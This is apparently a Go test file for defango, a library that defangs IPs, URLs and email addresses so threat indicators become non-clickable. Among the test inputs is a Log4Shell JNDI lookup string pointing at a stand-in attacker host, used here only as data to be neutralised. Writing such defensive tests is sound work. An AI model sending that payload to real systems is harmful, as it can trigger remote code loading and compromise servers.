/*
defango - URL / IP / Email defanging with Golang. Make IoC harmless.

This repository is under MIT License https://github.com/edoardottt/defango/blob/main/LICENSE
*/

package defango_test

import (
	"net/url"
	"testing"

	"github.com/edoardottt/defango"
	"github.com/stretchr/testify/require"
)

func TestIP(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			name:  "empty string",
			input: "",
			want:  "",
		},
		{
			name:  "Ipv4",
			input: "8.8.8.8",
			want:  "8[.]8[.]8[.]8",
		},
		{
			name:  "Short Ipv4",
			input: "1.1",
			want:  "1[.]1",
		},
		{
			name:  "Ipv4 + port",
			input: "8.8.8.8:53",
			want:  "8[.]8[.]8[.]8[:]53",
		},
		{
			name:  "Short Ipv4 + port",
			input: "8.8:53",
			want:  "8[.]8[:]53",
		},
		{
			name:  "Ipv6",
			input: "2001:0db8:85a3:0000:0000:8a2e:0370:7334",
			want:  "2001[:]0db8[:]85a3[:]0000[:]0000[:]8a2e[:]0370[:]7334",
		},
		{
			name:  "Short Ipv6",
			input: "2001:0db8:85a3::8a2e:0370:7334",
			want:  "2001[:]0db8[:]85a3[::]8a2e[:]0370[:]7334",
		},
		{
			name:  "Ipv6 + port",
			input: "[2001:0db8:85a3:0000:0000:8a2e:0370:7334]:8080",
			want:  "[2001[:]0db8[:]85a3[:]0000[:]0000[:]8a2e[:]0370[:]7334][:]8080",
		},
		{
			name:  "Short Ipv6 + port",
			input: "[2001:0db8:85a3::8a2e:0370:7334]:8080",
			want:  "[2001[:]0db8[:]85a3[::]8a2e[:]0370[:]7334][:]8080",
		},
		{
			name:  "Ipv4-mapped Ipv6",
			input: "::ffff:192.168.1.1",
			want:  "[::]ffff[:]192[.]168[.]1[.]1",
		},
		{
			name:  "Ipv6 embedding Ipv4",
			input: "64:ff9b::8.8.8.8",
			want:  "64[:]ff9b[::]8[.]8[.]8[.]8",
		},
		{
			name:  "Ipv4 with ideographic full stops",
			input: "8\u30028\u30028\u30028",
			want:  "8[.]8[.]8[.]8",
		},
		{
			name:  "already defanged",
			input: "8[.]8[.]8[.]8[:]53",
			want:  "8[.]8[.]8[.]8[:]53",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := defango.IP(tt.input)
			require.Equal(t, tt.want, got)
		})
	}
}

func TestURL(t *testing.T) {
	tests := []struct {
		name  string
		input interface{}
		want  string
		err   error
	}{
		{
			name:  "empty string",
			input: "",
			want:  "",
			err:   nil,
		},
		{
			name:  "https URL",
			input: "https://edoardottt.com",
			want:  "hxxps://edoardottt[.]com",
			err:   nil,
		},
		{
			name:  "https URL with path",
			input: "https://github.com/edoardottt/defangjs",
			want:  "hxxps://github[.]com/edoardottt/defangjs",
			err:   nil,
		},
		{
			name:  "http URL",
			input: "http://edoardottt.com",
			want:  "hxxp://edoardottt[.]com",
			err:   nil,
		},
		{
			name:  "http URL with path",
			input: "http://github.com/edoardottt/defangjs",
			want:  "hxxp://github[.]com/edoardottt/defangjs",
			err:   nil,
		},
		{
			name:  "http URL and port",
			input: "http://edoardottt.com:8080",
			want:  "hxxp://edoardottt[.]com[:]8080",
			err:   nil,
		},
		{
			name:  "http URL with path and port",
			input: "http://github.com:8000/edoardottt/defangjs",
			want:  "hxxp://github[.]com[:]8000/edoardottt/defangjs",
			err:   nil,
		},
		{
			name:  "ftp URL",
			input: "ftp://github.com/edoardottt/defangjs",
			want:  "fxp://github[.]com/edoardottt/defangjs",
			err:   nil,
		},
		{
			name:  "ftp URL and port",
			input: "ftp://github.com:8000/edoardottt/defangjs",
			want:  "fxp://github[.]com[:]8000/edoardottt/defangjs",
			err:   nil,
		},
		{
			name:  "file URL",
			input: "file:///etc/hosts",
			want:  "fxle:///etc/hosts",
			err:   nil,
		},
		{
			name:  "URL no protocol",
			input: "edoardottt.com",
			want:  "edoardottt[.]com",
			err:   nil,
		},
		{
			name:  "URL malformed protocol",
			input: "://edoardottt.com",
			want:  "[://]edoardottt[.]com",
			err:   nil,
		},
		{
			name:  "URL no protocol and port",
			input: "edoardottt.com:8080",
			want:  "edoardottt[.]com[:]8080",
			err:   nil,
		},
		{
			name:  "https URL (url.URL)",
			input: *parseURL(t, "https://edoardottt.com"),
			want:  "hxxps://edoardottt[.]com",
			err:   nil,
		},
		{
			name:  "https URL with path (url.URL)",
			input: *parseURL(t, "https://github.com/edoardottt/defangjs"),
			want:  "hxxps://github[.]com/edoardottt/defangjs",
			err:   nil,
		},
		{
			name:  "http URL (url.URL)",
			input: *parseURL(t, "http://edoardottt.com"),
			want:  "hxxp://edoardottt[.]com",
			err:   nil,
		},
		{
			name:  "http URL with path (url.URL)",
			input: *parseURL(t, "http://github.com/edoardottt/defangjs"),
			want:  "hxxp://github[.]com/edoardottt/defangjs",
			err:   nil,
		},
		{
			name:  "http URL and port (url.URL)",
			input: *parseURL(t, "http://edoardottt.com:8080"),
			want:  "hxxp://edoardottt[.]com[:]8080",
			err:   nil,
		},
		{
			name:  "http URL with path and port (url.URL)",
			input: *parseURL(t, "http://github.com:8000/edoardottt/defangjs"),
			want:  "hxxp://github[.]com[:]8000/edoardottt/defangjs",
			err:   nil,
		},
		{
			name:  "ftp URL (url.URL)",
			input: *parseURL(t, "ftp://github.com/edoardottt/defangjs"),
			want:  "fxp://github[.]com/edoardottt/defangjs",
			err:   nil,
		},
		{
			name:  "ftp URL and port (url.URL)",
			input: *parseURL(t, "ftp://github.com:8000/edoardottt/defangjs"),
			want:  "fxp://github[.]com[:]8000/edoardottt/defangjs",
			err:   nil,
		},
		{
			name:  "file URL (url.URL)",
			input: *parseURL(t, "file:///etc/hosts"),
			want:  "fxle:///etc/hosts",
			err:   nil,
		},
		{
			name:  "URL no protocol (url.URL)",
			input: *parseURL(t, "edoardottt.com"),
			want:  "edoardottt[.]com",
			err:   nil,
		},
		{
			name:  "URL no protocol and port (url.URL)",
			input: *parseURL(t, "edoardottt.com:8080"),
			want:  "edoardottt[.]com[:]8080",
			err:   nil,
		},
		{
			name:  "uppercase scheme",
			input: "HTTP://evil.com",
			want:  "hxxp://evil[.]com",
			err:   nil,
		},
		{
			name:  "mixed case scheme",
			input: "hTTpS://evil.com",
			want:  "hxxps://evil[.]com",
			err:   nil,
		},
		{
			name:  "leading whitespace",
			input: " http://evil.com",
			want:  " hxxp://evil[.]com",
			err:   nil,
		},
		{
			name:  "text before URL",
			input: "see http://evil.com",
			want:  "see hxxp://evil[.]com",
			err:   nil,
		},
		{
			name:  "unknown scheme",
			input: "ldap://evil.com/a",
			want:  "ldap[://]evil[.]com/a",
			err:   nil,
		},
		{
			name:  "Log4Shell payload",
			input: "${jndi:ldap://evil.com/a}",
			want:  "${jndi[:]ldap[://]evil[.]com/a}",
			err:   nil,
		},
		{
			name:  "ideographic full stop in host",
			input: "http://evil\u3002com/x",
			want:  "hxxp://evil[.]com/x",
			err:   nil,
		},
		{
			name:  "fullwidth full stop, no protocol",
			input: "evil\uff0ecom",
			want:  "evil[.]com",
			err:   nil,
		},
		{
			name:  "percent-encoded dot in host only",
			input: "http://evil%2Ecom/%2e%2e/",
			want:  "hxxp://evil[.]com/%2e%2e/",
			err:   nil,
		},
		{
			name:  "Ipv6 host",
			input: "http://[2001:db8::1]:8080/",
			want:  "hxxp://[2001[:]db8[::]1][:]8080/",
			err:   nil,
		},
		{
			name:  "URL in query",
			input: "http://a.com/r?u=https://b.com",
			want:  "hxxp://a[.]com/r?u=hxxps://b[.]com",
			err:   nil,
		},
		{
			name:  "user info",
			input: "http://good.com@evil.com/",
			want:  "hxxp://good[.]com@evil[.]com/",
			err:   nil,
		},
		{
			name:  "already defanged",
			input: "hxxps://evil[.]com[:]8080/a[.]exe",
			want:  "hxxps://evil[.]com[:]8080/a[.]exe",
			err:   nil,
		},
		{
			name:  "already defanged, other notations",
			input: "hXXp://evil[dot]com(.)net",
			want:  "hXXp://evil[dot]com(.)net",
			err:   nil,
		},
		{
			name:  "already defanged unknown scheme",
			input: "ldap[://]evil[.]com",
			want:  "ldap[://]evil[.]com",
			err:   nil,
		},
		{
			name:  "https URL (*url.URL)",
			input: parseURL(t, "https://edoardottt.com"),
			want:  "hxxps://edoardottt[.]com",
			err:   nil,
		},
		{
			name:  "ideographic full stop in host (*url.URL)",
			input: parseURL(t, "http://evil\u3002com/"),
			want:  "hxxp://evil[.]com/",
			err:   nil,
		},
		{
			name:  "nil *url.URL",
			input: (*url.URL)(nil),
			want:  "",
			err:   defango.ErrUnsupportedInputType,
		},
		{
			name:  "float/integer input",
			input: 2,
			want:  "",
			err:   defango.ErrUnsupportedInputType,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := defango.URL(tt.input)
			require.ErrorIs(t, err, tt.err)
			require.Equal(t, tt.want, got)
		})
	}
}

func TestURLHostOnly(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			name:  "path, query and fragment kept",
			input: "http://evil.com:8080/m4lw4r3.exe?q=a:b#x.y",
			want:  "hxxp://evil[.]com[:]8080/m4lw4r3.exe?q=a:b#x.y",
		},
		{
			name:  "URL in query",
			input: "http://a.com/r?u=https://b.com/x.y",
			want:  "hxxp://a[.]com/r?u=hxxps://b[.]com/x.y",
		},
		{
			name:  "user info, no protocol",
			input: "user:pass@evil.com/a.b",
			want:  "user[:]pass@evil[.]com/a.b",
		},
		{
			name:  "file URL",
			input: "file:///etc/hosts.allow",
			want:  "fxle:///etc/hosts.allow",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := defango.URL(tt.input, defango.HostOnly())
			require.NoError(t, err)
			require.Equal(t, tt.want, got)
		})
	}
}

func TestEmail(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			name:  "empty string",
			input: "",
			want:  "",
		},
		{
			name:  "email address",
			input: "edoardott@gmail.com",
			want:  "edoardott@gmail[.]com",
		},
		{
			name:  "email link",
			input: "mailto:edoardott@gmail.com",
			want:  "mailto[:]edoardott@gmail[.]com",
		},
		{
			name:  "ideographic full stop",
			input: "user@evil\u3002com",
			want:  "user@evil[.]com",
		},
		{
			name:  "already defanged",
			input: "user@evil[.]com",
			want:  "user@evil[.]com",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := defango.Email(tt.input)
			require.Equal(t, tt.want, got)
		})
	}
}

func parseURL(t *testing.T, input string) *url.URL {
	t.Helper()

	u, err := url.Parse(input)
	require.NoError(t, err)

	return u
}
